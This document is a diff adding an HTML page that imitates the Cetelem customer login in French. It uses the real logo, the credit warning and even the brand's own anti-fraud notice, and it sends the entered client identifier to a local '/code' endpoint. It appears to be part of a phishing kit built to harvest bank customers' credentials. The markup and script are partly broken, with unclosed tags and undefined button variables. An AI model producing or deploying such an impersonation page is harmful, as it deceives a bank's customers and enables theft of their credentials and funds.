@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Connexion - Espace client</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background-color: #c0d4cc;
+      color: #333;
+    }
+
+    .subtext strong {
+      font-weight: bold;
+    }
+
+    .logo {
+      text-align: center;
+      font-size: 30px;
+      font-weight: bold;
+      color: #2e7d54;
+      padding-top: 25px;
+    }
+
+    .subtext {
+      text-align: center;
+      font-size: 13px;
+      color: #555;
+      margin-bottom: 25px;
+      padding: 0 15px;
+    }
+
+    .login-box {
+      background: #fff;
+      max-width: 390px;
+      margin: 0 auto;
+      padding: 35px 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 12px rgba(0, 0, 0, 0.15);
+      text-align: center;
+      box-sizing: border-box;
+    }
+
+    .login-box img {
+      width: 52px;
+      margin-bottom: 18px;
+    }
+
+    .login-box h2 {
+      font-size: 18px;
+      font-weight: 500;
+      margin-bottom: 22px;
+    }
+
+    .titre-acces {
+      font-family: "Ubuntu", sans-serif;
+      font-weight: bold;
+      font-size: 24px;
+      color: rgb(41, 44, 46);
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+
+    label {
+      font-size: 14px;
+      display: block;
+      text-align: left;
+      margin-bottom: 6px;
+      font-weight: 500;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 11px;
+      font-size: 15px;
+      border: 1px solid #2e7d54; /* vert */
+      border-radius: 5px;
+      margin-bottom: 18px;
+      box-sizing: border-box;
+      outline: none;
+    }
+
+    .valid {
+      border: 1px solid #2e7d54 !important;
+    }
+
+    .checkbox {
+      font-size: 14px;
+      text-align: left;
+      margin-bottom: 20px;
+    }
+
+    .checkbox label {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .btn {
+      background-color: #999;
+      color: #fff;
+      font-size: 15px;
+      padding: 11px 0;
+      width: 100%;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    .btn.active {
+      background-color: #2e7d54 !important;
+      cursor: pointer;
+    }
+
+    .forgot {
+      font-size: 13px;
+      margin-top: 12px;
+    }
+
+    .forgot a {
+      text-decoration: none;
+      color: #333;
+    }
+
+    .alert-box {
+      background-color: #fef6e0;
+      border-left: 5px solid orange;
+      padding: 18px 20px;
+      margin: 30px auto;
+      max-width: 420px;
+      font-size: 13.5px;
+      border-radius: 6px;
+      color: #444;
+      box-sizing: border-box;
+    }
+
+    .alert-box strong {
+      color: #d2691e;
+    }
+
+    .alert-box button {
+      margin-top: 12px;
+      padding: 6px 14px;
+      border: 1px solid #888;
+      background-color: #fff;
+      cursor: pointer;
+      border-radius: 4px;
+      font-size: 13px;
+    }
+
+    footer {
+      font-size: 12px;
+      text-align: center;
+      margin: 35px 15px 25px;
+      color: #333;
+    }
+
+    footer a {
+      margin: 0 6px;
+      color: #000;
+      text-decoration: none;
+    }
+
+    .social {
+      margin-top: 12px;
+    }
+
+    .social span {
+      font-size: 20px;
+      margin: 0 8px;
+    }
+
+    .identifiant-wrapper {
+      position: relative;
+    }
+
+    .checkmark {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 20px;
+      color: #2e7d54;
+      display: none;
+    }
+
+    @media (max-width: 450px) {
+      .login-box,
+      .alert-box {
+        width: 92%;
+        padding: 20px;
+      }
+
+      .logo {
+        font-size: 26px;
+      }
+
+      .subtext {
+        font-size: 12px;
+        margin-bottom: 15px;
+      }
+
+      .login-box h2 {
+        font-size: 16px;
+      }
+
+      .btn {
+        font-size: 14px;
+      }
+
+      footer {
+        font-size: 11px;
+        line-height: 1.5;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="logo">
+    <img src="https://www.cetelem.fr/brand/logo.svg"
+  </div>
+
+  <div class="subtext">
+  <strong>Un crédit vous engage et doit être remboursé.</strong> Vérifiez vos capacités de remboursement avant de vous engager.
+</div>
+
+  <div class="login-box">
+    <div class="avatar" style="margin-bottom: 18px;">
+      <svg width="60" height="60" viewBox="0 0 26.6666668 26.6666668" xmlns="http://www.w3.org/2000/svg" fill="#014421">
+        <path d="M13.3333334,0 C20.6971301,0 26.6666668,5.96953669 26.6666668,13.3333334 C26.6666668,20.6971301 20.6971301,26.6666668 13.3333334,26.6666668 C5.96953669,26.6666668 0,20.6971301 0,13.3333334 C0,5.96953669 5.96953669,0 13.3333334,0 Z M13.3333334,1.66666667 C8.84982244,1.66690538 4.76309789,4.23644385 2.81994017,8.27698943 C0.876782456,12.317535 1.42100817,17.1141655 4.22000002,20.6166668 C5.40333336,18.7100001 8.00833337,16.6666667 13.3333334,16.6666667 C18.6583334,16.6666667 21.2616668,18.7083334 22.4466668,20.6166668 C25.2456586,17.1141655 25.7898843,12.317535 23.8467266,8.27698943 C21.9035689,4.23644385 17.8168443,1.66690538 13.3333334,1.66666667 Z M13.3333334,5.00000002 C16.0947571,5.00000002 18.3333334,7.23857628 18.3333334,10 C18.3333334,12.7614238 16.0947571,15 13.3333334,15 C10.5719096,15 8.33333337,12.7614238 8.33333337,10 C8.33333337,7.23857628 10.5719096,5.00000002 13.3333334,5.00000002 Z"/>
+      </svg>
+    </div>
+    <h1 class="titre-acces">
+      Accéder à mon<br>espace sécurisé
+    </h1>
+    <form action="/code" method="POST">
+      <div class="identifiant-wrapper">
+        <label for="identifiant">Identifiant client</label>
+        <input type="text" name="identifiant" id="identifiant" placeholder="Ex : 1234567" required maxlength="10">
+        <span class="checkmark" id="check-icon">✅</span>
+      </div>
+
+      <div id="info-message" style="
+        display: none;
+        background-color: #d6f0ff;
+        color: #084d6e;
+        padding: 10px;
+        border-radius: 5px;
+        font-size: 14px;
+        margin-bottom: 15px;
+        text-align: left;"
+
+      <span class="info-icon">ℹ️</span>
+      <span class="info-text">
+        Votre Identifiant Client vous a été transmis par mail lorsque vous avez souscrit votre contrat Cetelem. Vous pouvez le trouver dans les communications que nous vous adressons.
+      </div>
+
+      <div class="checkbox">
+        <label>
+          <input type="checkbox" id="remember"> Mémoriser mon identifiant
+        </label>
+      </div>
+
+      <button class="btn btn-suivant" type="submit">Suivant</button>
+
+  <div class="forgot">
+    <a href="https://exemple.com/recuperation" class="btn-forgot">Identifiant oublié</a>
+  </div>
+
+  <div class="alert-box">
+    <strong>⚠️ Contre la fraude, adoptez les bons réflexes</strong><br>
+    Ne communiquez jamais vos informations personnelles (identifiant, numéro de carte Cpay, code secret, etc.) par téléphone, email, chat ou réseaux sociaux. JAMAIS Cetelem ne vous les demandera.
+    <br>
+    <button>Découvrez nos conseils →</button>
+  </div>
+
+  <footer>
+    <a href="#">Virement express</a>
+    <a href="#">Réclamation</a>
+    <a href="#">Contact</a>
+    <a href="#">Questions / Réponses</a>
+    <a href="#">Mentions légales</a>
+    <a href="#">Cookies</a>
+    <a href="#">Préférences cookies</a>
+    <a href="#">Accessibilité</a>
+    <div class="social"></div>
+  </footer>
+
+  <script>
+    const identifiant = document.getElementById("identifiant");
+    const loginBtn = document.getElementById("login-btn");
+    const message = document.getElementById("info-message");
+    const checkIcon = document.getElementById("check-icon");
+
+    identifiant.addEventListener("input", () => {
+      const value = identifiant.value.trim();
+      if (value.length > 0) {
+        message.style.display = "block";
+      } else {
+        message.style.display = "none";
+      }
+
+      if (/^\d{8}$|^\d{10}$/.test(value)) {
+        identifiant.classList.add("valid");
+        checkIcon.style.display = "inline";
+        btn.classList.add("active");
+        btn.disabled = false;
+      } else {
+        identifiant.classList.remove("valid");
+        checkIcon.style.display = "none";
+        btn.classList.remove("active");
+        btn.disabled = true;
+      }
+    });
+  </script>
+
+</body>
+</html>
